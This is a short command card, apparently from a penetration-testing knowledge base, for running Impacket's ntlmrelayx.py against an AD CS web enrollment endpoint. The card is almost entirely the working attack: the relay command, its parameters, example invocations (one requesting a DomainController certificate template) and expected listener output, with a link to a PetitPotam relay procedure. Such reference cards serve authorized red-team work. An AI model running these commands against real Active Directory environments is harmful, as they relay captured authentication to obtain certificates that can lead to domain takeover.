---
id: 1cce9fb7-aacd-40a7-b853-8b3c2c82bd33
name: run-ntlmrelayx-adcs
type: command
executor: bash
data: >-
  python3 ntlmrelayx.py -t http://$_CA_SERVER/certsrv/certfnsh.asp -smb2support
  --adcs --template $_TEMPLATE_NAME
output: null
created_at: '2023-04-06T03:56:05.989619+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - ntlm-relay
  - ad-cs
verified: true
validated: true
---

# run-ntlmrelayx-adcs

## Command

```bash
python3 ntlmrelayx.py -t http://$_CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template $_TEMPLATE_NAME
```

## Description

Starts an NTLM relay server targeting AD CS web enrollment to request certificates upon receiving relayed authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t http://$_CA_SERVER/certsrv/certfnsh.asp | AD CS server URL for relay target | Yes |
| -smb2support | Enable SMB2 protocol support | Yes |
| --adcs | Enable AD CS certificate request mode | Yes |
| --template $_TEMPLATE_NAME | Certificate template name (e.g., VulnTemplate, DomainController) | No |

## Examples

### Basic Usage

```bash
python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs
```

### With Template

```bash
python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

## Expected Output

Relay server listening on all interfaces
[2023-10-01 12:00:00] INFO - Servers started on 445 (SMB), 80 (HTTP)

## Related

- [[procedures/AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam]]
- [[tools/Impacket]]
